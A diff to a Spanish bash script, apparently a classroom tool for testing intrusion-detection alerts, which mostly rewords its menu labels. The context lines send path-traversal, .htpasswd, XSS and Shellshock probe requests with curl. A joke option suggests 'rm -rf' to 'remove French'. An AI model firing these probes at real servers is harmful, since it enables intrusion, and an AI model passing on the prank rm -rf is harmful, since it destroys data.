@@ -69,14 +69,14 @@ vIP="$1"
       apt-get -y install dialog
       echo ""
     fi
-  menu=(dialog --checklist "Que tipo de ataque deseas ejecutar:" 22 96 16)
+  menu=(dialog --checklist "Que tipo de ataque deseas ejecutar:" 22 70 16)
     opciones=(
-      1 "Web.Server.Password.File.Access"                 on
-      2 "HTPasswd.Access"                                 off
-      3 "Cross.Site.Scripting"                            off
-      4 "Generic.Path.Traversal.Detection"                off
-      5 "Bash.Function.Definitions.Remote.Code.Execution" off
-      6 "Odio a Iñigo 24"                                 off
+      1 "Escalar hasta el archivo /etc/passwd del servidor"          off
+      2 "Acceder a las credenciales de autenticación de una carpeta" off
+      3 "Inyectar código Javascript malicioso"                       off
+      4 "Acceder al archivo passwd del servidor usando PHP"          off
+      5 "Ejecutar un comando de Bash en la cabecera TCP"             off
+      6 "Odio a Iñigo 24"                                            off
     )
   choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
     for choice in $choices
@@ -86,7 +86,7 @@ vIP="$1"
           1)
 
             echo ""
-            echo "  Opción 1..."
+            echo "  Intentando escalar hasta el archivo /etc/passwd del servidor..."
             echo ""
             # Alerta: Web.Server.Password.File.Access
                curl -X GET "http://"$vIP":80/../../etc/passwd"
@@ -96,7 +96,7 @@ vIP="$1"
           2)
 
             echo ""
-            echo "  HTPasswd.Access..."
+            echo "  Intentando acceder a las credenciales de autenticación de una carpeta..."
             echo ""
             # Alerta: HTPasswd.Access
               curl -X GET "http://"$vIP":80/.htpasswd"
@@ -106,7 +106,7 @@ vIP="$1"
           3)
 
             echo ""
-            echo "  Opción 3..."
+            echo "  Intentando inyectar código Javascript malicioso..."
             echo ""
             # Alerta: Cross.Site.Scripting
               curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
@@ -116,7 +116,7 @@ vIP="$1"
           4)
 
             echo ""
-            echo "  Opción 4..."
+            echo "  Intentando acceder al archivo passwd del servidor usando PHP..."
             echo ""
             # Alerta: Generic.Path.Traversal.Detection
               curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"
@@ -126,7 +126,7 @@ vIP="$1"
           5)
 
             echo ""
-            echo "  Opción 5..."
+            echo "  Intentando ejecutar un comando de Bash en la cabecera TCP..."
             echo ""
             # Alerta: Bash.Function.Definitions.Remote.Code.Execution
               curl -X GET "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
@@ -136,13 +136,13 @@ vIP="$1"
           6)
 
             echo ""
-            echo "  Has suspendido bastgionado, por listo!  Sin embargo..."
+            echo "  Has suspendido bastionado, por listo!  Sin embargo..."
             echo ""
             echo "  Si borras el idioma fránces del sistema, podrás sacar, al menos, un 5."
             echo ""
             echo "  Puedes hacerlo con:"
             echo ""
-            echo "  rm -rf ...    (de remove rapidly french)"
+            echo "  rm -rf ...    (de Remove Muy Rapidly French)"
             echo ""
 
           ;;
